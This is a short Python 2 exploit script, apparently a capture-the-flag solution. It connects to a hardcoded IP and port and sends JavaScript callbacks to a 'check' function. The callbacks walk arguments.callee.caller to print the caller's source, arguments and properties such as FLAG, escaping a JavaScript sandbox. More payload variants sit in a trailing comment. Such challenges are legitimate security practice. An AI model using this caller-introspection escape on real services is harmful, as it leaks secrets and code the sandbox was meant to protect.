__author__ = 'HuyNA'
'''
54.178.218.50 6789
'''
import sys
import os
import socket
import time
import telnetlib
import struct

def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
local_host="54.178.218.50"
local_port = 6789
s.connect((local_host, local_port))

print recv_until(s,'> ')

command = 'function anyuh(aa){print(aa);print(arguments.callee.caller.caller.toString());print(arguments.callee.caller.caller.arguments);print(typeof arguments.callee.caller);};check(anyuh);' + '\n'
s.send(command)
time.sleep(0.01)

print recv_until(s,'\n> ')

'''
function anyuh(aa){ function inner(){print(aa)};inner();print(arguments.callee.caller.caller.FLAG);print(arguments.callee.caller.caller.arguments);print(typeof arguments.callee.caller);};check(anyuh);

function anyuh(aa){print("hala");print(window);print(typeof arguments.callee.caller.caller.name);print(arguments.callee.caller.caller.stage1);};check(anyuh);

'''